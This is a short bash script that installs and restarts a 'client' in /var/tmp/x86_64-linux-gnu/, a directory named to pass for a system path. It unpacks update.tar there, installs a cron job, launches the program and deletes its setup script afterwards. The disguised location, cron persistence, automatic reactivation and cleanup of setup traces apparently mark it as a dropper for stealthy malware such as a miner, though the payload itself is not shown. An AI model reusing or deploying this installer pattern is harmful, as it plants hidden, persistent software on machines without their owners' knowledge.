#!/bin/bash

if [ -d /var/tmp/x86_64-linux-gnu/ ]; then
	printf ' [!] Client already installed.\n'
	VAR1=`pgrep -f "/var/tmp/x86_64-linux-gnu"`
	
	if [ -z "$VAR1" ]; then
		/var/tmp/x86_64-linux-gnu/run.sh
		/bin/sleep 0.1
		VAR2=`pgrep -f "/var/tmp/x86_64-linux-gnu"`
		
		if [ -z "$VAR2" ]; then
			printf ' [!] Failed to reactivate client; see file /var/tmp/x86_64-linux-gnu/debug.txt\n'
			exit 1
		else
			printf ' [!] Client reactivated (was inactive).\n'
			exit 2
		fi
	else
		printf ' [!] Client already active.\n'
		exit 3
	fi
fi

printf ' [!] Installing:   [              ] Creating Directory  '
mkdir -p /var/tmp/x86_64-linux-gnu/

printf '\r [!] Installing:   [==            ] Extracting TAR      '
tar -xf update.tar -C /var/tmp/x86_64-linux-gnu/

printf '\r [!] Installing:   [====          ] Changing Permissions'
chmod +x /var/tmp/x86_64-linux-gnu/*.sh

printf '\r [!] Installing:   [======        ] Changing Permissions'
chmod +x /var/tmp/x86_64-linux-gnu/config

printf '\r [!] Installing:   [========      ] Installing Cron Job '
/var/tmp/x86_64-linux-gnu/setup.sh

printf '\r [!] Installing:   [==========    ] Booting Executable  '
/var/tmp/x86_64-linux-gnu/run.sh

printf '\r [!] Installing:   [============  ] Cleaning Up         '
rm /var/tmp/x86_64-linux-gnu/setup.sh

/bin/sleep 0.1
VAR3=`pgrep -f "/var/tmp/x86_64-linux-gnu"`
if [ -z "$VAR3" ]; then
	printf '\r [!] Installing:   [==============] FAILURE             \n'
	printf ' [!] Failed to activate client; see file /var/tmp/x86_64-linux-gnu/debug.txt\n'
	exit 4
else
	printf '\r [!] Installing:   [==============] SUCCESS             \n'
	exit 0
fi

